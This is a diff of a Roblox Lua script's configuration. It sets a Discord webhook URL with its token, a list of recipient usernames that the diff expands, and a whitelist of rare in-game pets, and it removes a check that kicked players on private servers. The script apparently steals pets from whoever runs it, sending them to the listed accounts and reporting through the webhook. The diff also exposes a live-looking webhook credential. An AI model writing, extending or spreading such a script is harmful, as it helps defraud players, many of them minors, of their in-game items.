@@ -1,7 +1,7 @@
 -- ✅ Configuration
 local CONFIG = {
     WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
-    USERNAMES = { "saikigrow" },
+    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" }, -- ✅ multiple usernames here
     PET_WHITELIST = {
         "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
         "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
@@ -14,17 +14,6 @@ if _G.scriptExecuted then
 return
 end
 _G.scriptExecuted = true
-
-local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
-if getServerType and getServerType:IsA("RemoteFunction") then
-local ok, serverType = pcall(function()
-return getServerType:InvokeServer()
-end)
-if ok and serverType == "VIPServer" then
-plr:Kick("Server error. Please join a DIFFERENT server")
-return
-end
-end
 
 -- 🛠️ Services & Variables
 repeat task.wait() until game:IsLoaded()
